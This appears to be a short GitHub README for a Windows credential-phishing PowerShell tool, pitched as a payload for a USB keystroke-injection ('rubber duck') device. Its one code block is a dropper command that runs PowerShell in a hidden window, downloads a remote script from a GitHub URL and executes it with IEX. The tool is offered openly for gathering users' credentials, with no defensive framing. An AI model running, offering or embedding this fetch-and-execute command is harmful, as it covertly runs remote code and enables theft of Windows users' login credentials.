# Windows credentials powershell phishing
Super duper simple powershell script for gather user credentials. Useful as rubber duck payload

Example of payload dropper command
```
powershell  -WindowStyle hidden -c IEX($(iwr https://raw.githubusercontent.com/5unr153/Windows_credentials_phish/main/payload.ps1).Content)
```
